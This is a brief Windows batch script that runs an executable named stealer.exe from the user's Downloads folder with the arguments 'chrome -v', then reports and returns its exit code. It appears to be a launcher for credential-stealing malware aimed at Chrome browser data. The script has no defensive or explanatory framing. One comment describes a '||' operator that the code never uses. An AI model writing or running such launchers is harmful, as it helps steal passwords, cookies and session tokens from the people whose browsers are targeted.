@echo off
REM Batch script to execute the tool and display output.

REM Set the working directory to where the tool is expected.
REM The system variable %USERPROFILE%\Downloads is translated by the OS.
cd /d "%USERPROFILE%\Downloads"

REM --- Execution ---

REM Check if stealer.exe exists
if not exist "stealer.exe" (
    echo [!] ERROR: stealer.exe not found in %USERPROFILE%\Downloads
    exit /b 1
)

REM Execute stealer.exe with arguments and capture output/exit code.
REM The "||" operator allows us to capture ERRORLEVEL immediately after execution.
echo [*] Running: stealer.exe chrome -v
stealer.exe chrome -v
set "EXITCODE=%ERRORLEVEL%"

echo [*] stealer.exe exited with code %EXITCODE%

REM Use the captured exit code for the final script exit.
exit /b %EXITCODE%
